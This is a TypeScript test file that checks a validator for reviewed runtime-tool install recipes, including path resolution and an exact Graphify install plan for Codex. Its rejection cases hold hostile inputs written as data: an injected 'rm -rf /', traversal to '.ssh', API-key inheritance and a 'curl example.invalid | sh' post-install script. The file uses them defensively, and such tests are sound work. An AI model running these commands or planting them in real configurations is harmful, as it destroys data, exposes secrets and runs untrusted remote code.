import { describe, expect, it } from "vitest";
import { GRAPHIFY_RECIPE, planRuntimeTool } from "../src/core/runtime-tools.js";
import {
  parseRuntimeToolRecipe,
  resolveRuntimeRecipePath,
  runtimeArtifactRequirement,
} from "../src/core/runtime-tool-recipe.js";
import type { DetectedAgent } from "../src/shared/types.js";

describe("reviewed runtime recipe schema", () => {
  it("validates the complete Graphify recipe and discloses bounded dependencies", () => {
    expect(parseRuntimeToolRecipe(GRAPHIFY_RECIPE)).toEqual(GRAPHIFY_RECIPE);
    expect(GRAPHIFY_RECIPE.schemaVersion).toBe(1);
    expect(GRAPHIFY_RECIPE.dependencies.resolution).toBe("cutoff-bounded");
    expect(GRAPHIFY_RECIPE.dependencies.disclosure).toMatch(
      /not fully locked/i,
    );
    expect(GRAPHIFY_RECIPE.dependencies.hostTools).toEqual([
      expect.objectContaining({ executable: "uv" }),
    ]);
    expect(runtimeArtifactRequirement(GRAPHIFY_RECIPE)).toBe(
      `graphifyy @ ${GRAPHIFY_RECIPE.artifactUrl}#sha256=${GRAPHIFY_RECIPE.artifactSha256}`,
    );
  });

  it.each([
    [
      "unknown executable fields",
      (recipe: any) => {
        recipe.commands.install[0].shell = true;
      },
    ],
    [
      "shell executables",
      (recipe: any) => {
        recipe.commands.install[0].executable = "bash";
      },
    ],
    [
      "command injection characters",
      (recipe: any) => {
        recipe.commands.install[0].args[0] = "tool\nrm -rf /";
      },
    ],
    [
      "unknown command interpolation",
      (recipe: any) => {
        recipe.commands.install[0].args[0] = "{userControlled}";
      },
    ],
    [
      "target traversal",
      (recipe: any) => {
        recipe.targets.codex.path = ["..", ".ssh"];
      },
    ],
    [
      "Windows device paths",
      (recipe: any) => {
        recipe.targets.codex.path = ["NUL"];
      },
    ],
    [
      "secret inheritance",
      (recipe: any) => {
        recipe.environment.inherit.push("OPENAI_API_KEY");
      },
    ],
    [
      "unreviewed environment output",
      (recipe: any) => {
        recipe.environment.fixed.OPENAI_API_KEY = {
          root: "userHome",
          path: [],
        };
      },
    ],
    [
      "artifact alias mismatch",
      (recipe: any) => {
        recipe.artifacts[0].sha256 = "a".repeat(64);
      },
    ],
    [
      "unpinned source URL",
      (recipe: any) => {
        recipe.source = recipe.sourceRepository;
      },
    ],
    [
      "incomplete snapshots",
      (recipe: any) => {
        recipe.snapshotRoots = ["{runtimeRoot}"];
      },
    ],
    [
      "unknown top-level behavior",
      (recipe: any) => {
        recipe.postInstallScript = "curl example.invalid | sh";
      },
    ],
  ])("rejects malicious or ambiguous recipes: %s", (_name, mutate) => {
    const recipe = structuredClone(GRAPHIFY_RECIPE);
    mutate(recipe);
    expect(() => parseRuntimeToolRecipe(recipe)).toThrow();
  });

  it("resolves runtime and target paths with native Windows semantics", () => {
    const stateHome = "C:\\Users\\Ada\\AppData\\Local\\Loadout";
    const userHome = "C:\\Users\\Ada";
    const runtimeRoot = resolveRuntimeRecipePath(
      stateHome,
      ["runtime", GRAPHIFY_RECIPE.id],
      "win32",
    );
    expect(runtimeRoot).toBe(
      "C:\\Users\\Ada\\AppData\\Local\\Loadout\\runtime\\graphify",
    );
    expect(
      resolveRuntimeRecipePath(
        runtimeRoot,
        GRAPHIFY_RECIPE.runtime.binaryPaths.win32,
        "win32",
      ),
    ).toBe(`${runtimeRoot}\\bin\\graphify.exe`);
    expect(
      resolveRuntimeRecipePath(
        userHome,
        GRAPHIFY_RECIPE.targets.codex!.path,
        "win32",
      ),
    ).toBe("C:\\Users\\Ada\\.codex\\skills\\graphify");
  });

  it("preserves the exact reviewed Graphify command plan", async () => {
    const home = "/tmp/loadout-recipe-parity/home";
    const stateHome = "/tmp/loadout-recipe-parity/state";
    const agent: DetectedAgent = {
      id: "codex",
      displayName: "Codex",
      installed: true,
      skillsDirectory: `${home}/.agents/skills`,
    };
    const plan = await planRuntimeTool("graphify", {
      home,
      stateHome,
      requestedAgents: ["codex"],
      detectedAgents: [agent],
    });

    expect(plan.agents).toEqual([
      {
        id: "codex",
        displayName: "Codex",
        target: `${home}/.codex/skills/graphify`,
      },
    ]);
    expect(plan.commands).toEqual([
      {
        command: "uv",
        args: [
          "tool",
          "install",
          `graphifyy @ ${GRAPHIFY_RECIPE.artifactUrl}#sha256=${GRAPHIFY_RECIPE.artifactSha256}`,
          "--exclude-newer",
          "2026-07-17T00:00:00Z",
        ],
        purpose:
          "install the exact hashed Graphify wheel in isolated Loadout state",
      },
      {
        command: `${stateHome}/runtime/graphify/bin/graphify`,
        args: ["install", "--platform", "codex"],
        purpose: "generate the official Codex Graphify skill",
      },
      {
        command: `${stateHome}/runtime/graphify/bin/graphify`,
        args: ["--version"],
        purpose: "verify Graphify 0.9.17",
      },
    ]);
    expect(plan.guarantees).toEqual(GRAPHIFY_RECIPE.guarantees);
  });
});
